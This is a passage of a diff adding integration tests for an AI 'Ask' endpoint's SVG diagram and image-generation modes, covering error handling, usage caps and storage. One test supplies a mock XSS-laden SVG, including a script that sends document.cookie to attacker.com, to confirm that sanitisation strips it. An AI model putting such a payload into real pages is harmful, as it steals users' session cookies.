+              question: 'Draw a diagram that exceeds size',
+              mode: 'svg',
+            });
+
+          assert.equal(res.status, 502);
+          assert.equal(res.body.error, true);
+          assert.match(res.body.message, /100 KB/i);
+
+          // Verify nothing saved to conversation
+          const convCount = await Conversation.countDocuments({ user: svgUser._id });
+          assert.equal(convCount, 0, 'No conversation should be saved on oversized rejection');
+        } finally {
+          mockGetClient.mock.restore();
+          mockFallback.mock.restore();
+        }
+      });
+
+      it('8.11 strips malicious tags and scripts from Gemini output before returning and saving', async () => {
+        const maliciousOutput = `=== DESCRIPTION ===
+Diagram with injected XSS payload
+=== SVG ===
+<svg viewBox="0 0 200 200" onload="alert('owned')">
+  <script>fetch('https://attacker.com?steal=' + document.cookie)</script>
+  <foreignObject><div><iframe src="https://evil.com"></iframe></div></foreignObject>
+  <a href="javascript:alert('click')">click me</a>
+  <circle cx="100" cy="100" r="50" fill="#10b981"/>
+</svg>`;
+
+        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+        const mockFallback = mock.method(
+          geminiConfig,
+          'generateWithModelFallback',
+          async () => maliciousOutput
+        );
+
+        try {
+          const res = await request(server)
+            .post('/api/ask')
+            .set('Authorization', authSvgUser)
+            .send({
+              question: 'Draw a circle diagram with scripts',
+              mode: 'svg',
+            });
+
+          assert.equal(res.status, 200);
+          assert.ok(res.body.svg);
+          assert.ok(!res.body.svg.includes('<script>'), 'Must strip <script>');
+          assert.ok(!res.body.svg.includes('onload'), 'Must strip onload');
+          assert.ok(!res.body.svg.includes('attacker.com'), 'Must strip script payload');
+          assert.ok(!res.body.svg.includes('<foreignObject>'), 'Must strip foreignObject');
+          assert.ok(!res.body.svg.includes('<iframe'), 'Must strip iframe');
+          assert.ok(!res.body.svg.includes('javascript:'), 'Must strip javascript: link');
+          assert.ok(res.body.svg.includes('<circle'), 'Must retain valid circle tag');
+
+          // Verify saved conversation is also sanitized
+          const savedConv = await Conversation.findById(res.body.conversationId);
+          assert.ok(!savedConv.messages[1].svg.includes('<script>'));
+          assert.ok(!savedConv.messages[1].svg.includes('onload'));
+        } finally {
+          mockGetClient.mock.restore();
+          mockFallback.mock.restore();
+        }
+      });
+
+      it('8.12 can retrieve conversation containing saved SVG diagram via GET /api/ask/conversations/:id', async () => {
+        const diagramOutput = `=== DESCRIPTION ===
+Simple triangle diagram
+=== SVG ===
+<svg viewBox="0 0 100 100"><polygon points="50,15 90,85 10,85" fill="#3b82f6"/></svg>`;
+
+        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+        const mockFallback = mock.method(
+          geminiConfig,
+          'generateWithModelFallback',
+          async () => diagramOutput
+        );
+
+        try {
+          const askRes = await request(server)
+            .post('/api/ask')
+            .set('Authorization', authSvgUser)
+            .send({
+              question: 'Draw a triangle diagram',
+              mode: 'svg',
+            });
+
+          assert.equal(askRes.status, 200);
+          const convId = askRes.body.conversationId;
+
+          const getRes = await request(server)
+            .get(`/api/ask/conversations/${convId}`)
+            .set('Authorization', authSvgUser);
+
+          assert.equal(getRes.status, 200);
+          const messages = getRes.body.messages;
+          assert.equal(messages.length, 2);
+          assert.equal(messages[1].mode, 'svg');
+          assert.ok(messages[1].svg.includes('<polygon'));
+          assert.equal(messages[1].description, 'Simple triangle diagram');
+        } finally {
+          mockGetClient.mock.restore();
+          mockFallback.mock.restore();
+        }
+      });
+    });
+  });
+
+  // ==========================================
+  // ITEM 9: Ask AI Generate Image Mode
+  // ==========================================
+  describe('9. Ask AI Generate Image Mode', () => {
+    let genImgUser;
+    let authGenImgUser;
+
+    before(async () => {
+      genImgUser = await User.create({
+        name: 'Gen Image Test Student',
+        email: `genimgstudent_${Date.now()}@test.edu`,
+        password: 'password123',
+      });
+      authGenImgUser = `Bearer ${jwt.sign({ id: genImgUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;
+    });
+
+    beforeEach(async () => {
+      await Conversation.deleteMany({});
+      const today = getKolkataDateString();
+      if (genImgUser) {
+        await AskUsage.deleteMany({ user: genImgUser._id });
+      }
+    });
+
+    it('9.1 returns 503 "Image generation is not configured" when GEMINI_IMAGE_MODEL is missing', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      delete process.env.GEMINI_IMAGE_MODEL;
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Illustrate the structure of an atom with electrons and nucleus',
+            mode: 'image',
+          });
+
+        assert.equal(res.status, 503);
+        assert.equal(res.body.error, true);
+        assert.equal(res.body.message, 'Image generation is not configured');
+      } finally {
+        if (origModel) {
+          process.env.GEMINI_IMAGE_MODEL = origModel;
+        }
+      }
+    });
+
+    it('9.2 returns 503 with a clear message and no raw text when mock API rejects for billing', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      process.env.GEMINI_IMAGE_MODEL = 'imagen-3.0-generate-002';
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockGenImg = mock.method(geminiConfig, 'generateImage', async () => {
+        const err = new Error('Google Cloud billing is required to use imagen-3.0');
+        err.status = 400;
+        throw err;
+      });
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Draw a plant cell diagram',
+            mode: 'image',
+          });
+
+        assert.equal(res.status, 503);
+        assert.equal(res.body.error, true);
+        assert.match(res.body.message, /billing.*required/i);
+        assert.ok(!res.body.message.includes('imagen-3.0'), 'Must not leak raw model or error text');
+      } finally {
+        mockGetClient.mock.restore();
+        mockGenImg.mock.restore();
+        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
+      }
+    });
+
+    it('9.3 returns 503 with a clear message when mock API rejects for quota', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      process.env.GEMINI_IMAGE_MODEL = 'imagen-3.0-generate-002';
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockGenImg = mock.method(geminiConfig, 'generateImage', async () => {
+        const err = new Error('ResourceExhausted: 429 Rate limit / quota exceeded');
+        err.status = 429;
+        throw err;
+      });
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Draw an animal cell diagram',
+            mode: 'image',
+          });
+
+        assert.equal(res.status, 503);
+        assert.equal(res.body.error, true);
+        assert.match(res.body.message, /quota exceeded/i);
+      } finally {
+        mockGetClient.mock.restore();
+        mockGenImg.mock.restore();
+        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
+      }
+    });
+
+    it('9.4 returns 503 with a clear message when mock API rejects for safety block', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      process.env.GEMINI_IMAGE_MODEL = 'imagen-3.0-generate-002';
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockGenImg = mock.method(geminiConfig, 'generateImage', async () => {
+        const err = new Error('SAFETY_VIOLATION: blocked by content safety policy');
+        err.status = 400;
+        throw err;
+      });
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Unsafe image request',
+            mode: 'image',
+          });
+
+        assert.equal(res.status, 503);
+        assert.equal(res.body.error, true);
+        assert.match(res.body.message, /safety filter/i);
+      } finally {
+        mockGetClient.mock.restore();
+        mockGenImg.mock.restore();
+        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
+      }
+    });
+
+    it('9.5 returns 503 with a clear message when mock API rejects for key permission', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      process.env.GEMINI_IMAGE_MODEL = 'imagen-3.0-generate-002';
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockGenImg = mock.method(geminiConfig, 'generateImage', async () => {
+        const err = new Error('Permission denied: model not available on this API key');
+        err.status = 403;
+        throw err;
+      });
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Draw an anatomy diagram',
+            mode: 'image',
+          });
+
+        assert.equal(res.status, 503);
+        assert.equal(res.body.error, true);
+        assert.match(res.body.message, /not available on this API key/i);
+      } finally {
+        mockGetClient.mock.restore();
+        mockGenImg.mock.restore();
+        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
+      }
+    });
+
+    it('9.6 daily cap of 5 generated images returns 429 and gives slot back on failure', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      process.env.GEMINI_IMAGE_MODEL = 'imagen-3.0-generate-002';
+      const today = getKolkataDateString();
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      let shouldFail = true;
+      const mockGenImg = mock.method(geminiConfig, 'generateImage', async () => {
+        if (shouldFail) {
+          const err = new Error('Upstream transient glitch');
+          err.status = 500;
+          throw err;
+        }
+        return {
+          image: { mimeType: 'image/png', data: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==' },
+          caption: 'Educational diagram of photosynthesis',
+        };
+      });
+
+      try {
+        // 1. Initial usage is 0
+        const usageBefore = await AskUsage.findOne({ user: genImgUser._id, date: today });
+        assert.equal(usageBefore?.imageCount || 0, 0);
+
+        // 2. Request fails -> slot must be given back
+        const failRes = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Illustrate photosynthesis process',
+            mode: 'image',
+          });
+
+        assert.equal(failRes.status, 503);
+        const usageAfterFail = await AskUsage.findOne({ user: genImgUser._id, date: today });
+        assert.equal(usageAfterFail?.imageCount || 0, 0, 'Slot must be refunded after failure');
+
+        // 3. Set imageCount to 5 (limit reached)
+        await AskUsage.updateOne(
+          { user: genImgUser._id, date: today },
+          { imageCount: 5 },
+          { upsert: true }
+        );
+
+        const capRes = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Illustrate mitochondria',
+            mode: 'image',
+          });
+
+        assert.equal(capRes.status, 429);
+        assert.match(capRes.body.message, /daily image generation limit reached/i);
+      } finally {
+        mockGetClient.mock.restore();
+        mockGenImg.mock.restore();
+        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
+      }
+    });
+
+    it('9.7 successful mock returns image fields and saves prompt without storing base64', async () => {
+      const origModel = process.env.GEMINI_IMAGE_MODEL;
+      process.env.GEMINI_IMAGE_MODEL = 'imagen-3.0-generate-002';
+      const fakeBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockGenImg = mock.method(geminiConfig, 'generateImage', async () => ({
+        image: {
+          mimeType: 'image/png',
+          data: fakeBase64,
+        },
+        caption: 'A cross-section illustration of the human heart',
+      }));
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authGenImgUser)
+          .send({
+            question: 'Illustrate the chambers of the human heart',
+            mode: 'image',
+          });
+
+        assert.equal(res.status, 200);
+        assert.equal(res.body.mode, 'image');
+        assert.ok(res.body.image);
+        assert.equal(res.body.image.mimeType, 'image/png');
+        assert.equal(res.body.image.data, fakeBase64);
+        assert.match(res.body.caption, /human heart/i);
+        assert.ok(res.body.conversationId);
+
+        // Verify Conversation record in MongoDB
+        const conv = await Conversation.findById(res.body.conversationId);
+        assert.ok(conv);
+        assert.equal(conv.messages.length, 2);
+        assert.equal(conv.messages[0].role, 'user');
+        assert.equal(conv.messages[0].mode, 'image');
+        assert.equal(conv.messages[1].role, 'assistant');
+        assert.equal(conv.messages[1].mode, 'image');
+        assert.equal(conv.messages[1].generatedImage, true);
+        // CRITICAL CHECK: Base64 image data is NOT stored in conversation
+        assert.ok(!conv.messages[1].content.includes(fakeBase64), 'Image base64 data must NEVER be stored in DB');
+        assert.equal(conv.messages[1].svg, null);
+      } finally {
+        mockGetClient.mock.restore();
+        mockGenImg.mock.restore();
+        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
       }
     });
   });
